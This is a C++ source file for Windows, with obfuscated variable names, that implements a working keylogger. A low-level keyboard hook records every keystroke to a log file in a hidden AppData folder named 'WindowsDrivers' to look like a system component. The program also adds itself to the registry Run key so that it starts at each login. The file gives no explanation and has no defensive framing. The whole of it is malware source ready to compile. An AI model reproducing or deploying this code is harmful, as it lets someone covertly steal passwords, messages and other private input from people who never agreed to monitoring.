#include <windows.h>
#include <fstream>
#include <string>
#include <shlobj.h>

std::ofstream g1a;

void f1a(const std::string& g1b) {
    if (g1a.is_open()) {
        g1a << g1b;
    }
}

LRESULT CALLBACK f1b(int n1a, WPARAM w1a, LPARAM l1a) {
    if (n1a == HC_ACTION) {
        KBDLLHOOKSTRUCT *p1a = (KBDLLHOOKSTRUCT *)l1a;
        if (w1a == WM_KEYDOWN) {
            char k1a = MapVirtualKey(p1a->vkCode, MAPVK_VK_TO_CHAR);
            if (k1a >= 32 && k1a <= 126) {
                f1a(std::string(1, k1a));
            } else {
                switch (p1a->vkCode) {
                    case VK_SPACE:
                        f1a(" ");
                        break;
                    default:
                        f1a("[" + std::to_string(p1a->vkCode) + "]");
                        break;
                }
            }
        }
    }
    return CallNextHookEx(NULL, n1a, w1a, l1a);
}

std::string f1c() {
    char p1b[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, p1b) != S_OK) {
        return ""; 
    }

    std::string d1a = std::string(p1b) + "\\WindowsDrivers";
    std::string l1b = d1a + "\\windowsDrivers.log";

    int l1c = MultiByteToWideChar(CP_ACP, 0, d1a.c_str(), -1, NULL, 0);
    wchar_t* w1b = new wchar_t[l1c];
    MultiByteToWideChar(CP_ACP, 0, d1a.c_str(), -1, w1b, l1c);

    DWORD a1a = GetFileAttributesW(w1b); 
    if (a1a == INVALID_FILE_ATTRIBUTES) {
        if (!CreateDirectoryW(w1b, NULL)) { 
            delete[] w1b;
            return ""; 
        }
    }

    delete[] w1b; 
    return l1b; 
}

void f1d() {
    char p1c[MAX_PATH];
    GetModuleFileNameA(NULL, p1c, MAX_PATH);
    
    HKEY r1a;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &r1a, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(r1a, "MyApp", 0, REG_SZ, (const BYTE*)p1c, strlen(p1c) + 1);
        RegCloseKey(r1a);
    }
}

int WINAPI WinMain(HINSTANCE h1a, HINSTANCE h1b, LPSTR l1d, int n1b) {
    std::string l1e = f1c();
    if (l1e.empty()) {
        return 1;
    }

    g1a.open(l1e, std::ios::app);
    if (!g1a.is_open()) {
        return 1;
    }

    f1d(); 

    HHOOK h1c = SetWindowsHookEx(WH_KEYBOARD_LL, f1b, NULL, 0);
    if (h1c == NULL) {
        g1a.close();
        return 1;
    }

    MSG m1a;
    while (GetMessage(&m1a, NULL, 0, 0)) {
        TranslateMessage(&m1a);
        DispatchMessage(&m1a);
    }

    UnhookWindowsHookEx(h1c);
    g1a.close();
    return 0;
}
